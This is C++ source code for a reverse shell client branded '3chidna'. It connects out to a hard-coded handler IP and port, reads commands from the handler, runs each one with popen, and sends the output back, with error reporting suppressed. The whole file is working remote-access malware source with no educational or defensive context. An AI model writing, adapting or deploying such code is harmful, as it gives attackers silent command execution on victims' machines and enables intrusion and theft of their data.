#include <iostream>
#include <cstdio>
#include <cstring>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>

using namespace std;

class Process {
public:
    string exec(string command) {
        array<char, 128> buffer;
        string result;
        unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);
        /*if (!pipe) {
            cout << "! popen() failed!" << endl;
        }*/

        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
            result += buffer.data();
        }
        
        return result + "\\n";
    }
};

class Client {
    private:
    int clientSocket = 0;

    struct sockaddr_in server;

    public:
    Client(const char* handlerIP, int handlerPort) {
        clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (clientSocket < 0) {
            //cout << "! Socket has been failed to create" << endl;

            exit(1);
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(handlerPort);
        server.sin_addr.s_addr = inet_addr(handlerIP);
        memset(&server.sin_zero, 0, sizeof(server.sin_zero));
    }
    
    void clientConnect() {
        connect(clientSocket, (struct sockaddr*)&server, sizeof(server));
        /*int connectError = connect(clientSocket, (struct sockaddr*)&server, sizeof(server));
        if (connectError < 0) {
            cout << "! Client failed to connect" << endl;
        } else {
            cout << "! Client has connected" << endl;
        }*/
    }

    void clientSend(const char *output) {
        int outputLength = static_cast<int>(strlen(output));
        int sendError = send(clientSocket, output, outputLength, 0);
        if (sendError < 0) {
            //cout << "! Client failed to send the output" << endl;

            close(clientSocket);
        }
    }

    string clientReceive() {
        string data = "";

        while (true) {
            char buffer[1024] = { 0, };

            int bytesReceived = recv(clientSocket, buffer, 1024, 0);
            if (bytesReceived > 0) {
                data += buffer;

                int result = data.find("\\n");
                if (result != string::npos) {
                    string extractedData = "";
                    for (int i = 0; i < result; i++) {
                        extractedData += data[i];
                    }
                    data = extractedData;

                    break;
                }
            } else {
                close(clientSocket);

                break;
            }
        }

        return data;
    }

    /*~Client() {
        close(serverSocket);

        cout << "! Client socket has been closed" << endl;
    }*/
};

int main() {
    cout << "**3chidna**" << endl;

    Client client("192.168.0.53", 9090);
    Process process;

    client.clientConnect();

    while (true) {
        string receivedData = client.clientReceive();

        string output = process.exec(receivedData);

        client.clientSend(output.c_str());
    }

    return 0;
}